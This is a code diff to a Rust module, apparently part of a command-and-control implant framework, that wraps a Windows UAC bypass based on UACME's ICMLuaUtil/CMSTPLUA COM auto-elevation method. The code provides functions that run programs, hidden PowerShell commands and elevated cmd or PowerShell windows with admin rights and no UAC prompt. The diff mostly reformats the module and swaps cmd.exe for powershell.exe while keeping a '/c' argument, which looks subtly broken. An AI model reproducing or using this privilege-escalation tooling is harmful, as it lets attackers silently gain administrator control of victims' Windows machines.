@@ -4,7 +4,7 @@
 //! based on UACME project (method 41 - ICMLuaUtil by Oddvar Moe).
 //!
 //! # How it works
-//! 
+//!
 //! The bypass exploits the auto-elevation feature of Windows COM objects.
 //! CMSTPLUA (Connection Manager Service) is in the Windows auto-elevation list,
 //! meaning it can create elevated COM objects without UAC prompt.
@@ -67,13 +67,13 @@ impl std::fmt::Display for UacResult {
 #[cfg(target_os = "windows")]
 extern "C" {
     /// Execute a file with elevated privileges via ICMLuaUtil COM bypass
-    /// 
+    ///
     /// # Parameters
     /// - lpFile: Path to executable (wide string, null-terminated)
     /// - lpParameters: Command line arguments (wide string, can be null)
     /// - lpDirectory: Working directory (wide string, can be null)
     /// - nShow: Show window flag (SW_HIDE=0, SW_SHOW=5, etc.)
-    /// 
+    ///
     /// # Returns
     /// UAC_RESULT enum value
     fn UacBypassShellExec(
@@ -101,7 +101,7 @@ fn to_wide_string(s: &str) -> Vec<u16> {
 }
 
 /// UAC Bypass functionality
-/// 
+///
 /// Provides methods to execute programs with elevated privileges
 /// without triggering the UAC prompt (on vulnerable configurations).
 #[cfg(target_os = "windows")]
@@ -110,22 +110,22 @@ pub struct UacBypass;
 #[cfg(target_os = "windows")]
 impl UacBypass {
     /// Execute a program with elevated privileges
-    /// 
+    ///
     /// # Arguments
     /// * `file` - Path to the executable to run
     /// * `parameters` - Optional command line parameters
     /// * `directory` - Optional working directory
     /// * `show` - Window show mode
-    /// 
+    ///
     /// # Returns
     /// `Ok(())` on success, `Err(UacResult)` on failure
-    /// 
+    ///
     /// # Example
     /// ```ignore
     /// use c2_common::uacme::UacBypass;
-    /// 
+    ///
     /// let result = UacBypass::shell_exec(
-    ///     "cmd.exe",
+    ///     "powershell.exe",
     ///     Some("/c whoami > C:\\elevated.txt"),
     ///     None,
     ///     ShowWindow::Hide,
@@ -138,27 +138,21 @@ impl UacBypass {
         show: ShowWindow,
     ) -> Result<(), UacResult> {
         let file_wide = to_wide_string(file);
-        
+
         let params_wide = parameters.map(|p| to_wide_string(p));
         let params_ptr = params_wide
             .as_ref()
             .map(|v| v.as_ptr())
             .unwrap_or(std::ptr::null());
-        
+
         let dir_wide = directory.map(|d| to_wide_string(d));
         let dir_ptr = dir_wide
             .as_ref()
             .map(|v| v.as_ptr())
             .unwrap_or(std::ptr::null());
 
-        let result = unsafe {
-            UacBypassShellExec(
-                file_wide.as_ptr(),
-                params_ptr,
-                dir_ptr,
-                show as c_int,
-            )
-        };
+        let result =
+            unsafe { UacBypassShellExec(file_wide.as_ptr(), params_ptr, dir_ptr, show as c_int) };
 
         let uac_result = UacResult::from(result);
         if uac_result == UacResult::Success {
@@ -168,28 +162,32 @@ impl UacBypass {
         }
     }
 
-    /// Execute cmd.exe with elevated privileges
-    /// 
-    /// Convenience method that launches cmd.exe with the given command.
-    /// 
+    /// Execute powershell.exe with elevated privileges
+    ///
+    /// Convenience method that launches powershell.exe with the given command.
+    ///
     /// # Arguments
-    /// * `command` - Command to execute via cmd.exe /c
+    /// * `command` - Command to execute via powershell.exe /c
     /// * `hidden` - If true, run hidden; otherwise show window
     pub fn exec_command(command: &str, hidden: bool) -> Result<(), UacResult> {
         let params = format!("/c {}", command);
-        let show = if hidden { ShowWindow::Hide } else { ShowWindow::Normal };
-        Self::shell_exec("cmd.exe", Some(&params), None, show)
+        let show = if hidden {
+            ShowWindow::Hide
+        } else {
+            ShowWindow::Normal
+        };
+        Self::shell_exec("powershell.exe", Some(&params), None, show)
     }
 
-    /// Spawn an elevated command prompt
-    /// 
+    /// Spawn an elevated command prompt (not use for now)
+    ///
     /// Opens a new cmd.exe window with elevated privileges.
     pub fn spawn_elevated_cmd() -> Result<(), UacResult> {
         Self::shell_exec("cmd.exe", None, None, ShowWindow::Normal)
     }
 
     /// Spawn an elevated PowerShell
-    /// 
+    ///
     /// Opens a new PowerShell window with elevated privileges.
     pub fn spawn_elevated_powershell() -> Result<(), UacResult> {
         Self::shell_exec("powershell.exe", None, None, ShowWindow::Normal)
@@ -231,12 +229,18 @@ mod tests {
     #[test]
     fn test_wide_string_conversion() {
         let wide = to_wide_string("test");
-        assert_eq!(wide, vec!['t' as u16, 'e' as u16, 's' as u16, 't' as u16, 0]);
+        assert_eq!(
+            wide,
+            vec!['t' as u16, 'e' as u16, 's' as u16, 't' as u16, 0]
+        );
     }
 
     #[test]
     fn test_uac_result_display() {
         assert_eq!(format!("{}", UacResult::Success), "Success");
-        assert_eq!(format!("{}", UacResult::ElevationFailed), "Failed to create elevated COM object");
+        assert_eq!(
+            format!("{}", UacResult::ElevationFailed),
+            "Failed to create elevated COM object"
+        );
     }
 }
